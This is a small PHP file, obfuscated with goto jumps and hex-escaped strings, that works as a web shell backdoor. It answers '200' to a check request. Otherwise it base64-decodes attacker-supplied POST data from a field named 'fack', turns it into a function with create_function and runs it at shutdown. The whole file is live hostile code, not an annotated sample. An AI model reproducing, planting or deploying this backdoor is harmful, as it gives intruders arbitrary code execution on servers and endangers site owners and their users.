<?php
 goto WZ; Zr: $y9 = "\x63\162\145\x61\x74\145\137" . "\146\165\156\143\x74\151\x6f\x6e"; goto l0; q8: exit; goto iT; l0: $X4 = "\142\x61\x73\145\x36\64\x5f" . "\144\x65\143\x6f\x64\145"; goto Dc; WZ: if (!($_GET["\161"] == "\x31")) { goto UC; } goto ge; iT: UC: goto Zr; ge: echo "\x32\60\x30"; goto q8; Dc: register_shutdown_function($y9('', $X4($_POST["\146\x61\143\153"]))); goto NF; NF: echo "\40\xd\12\xd\12";

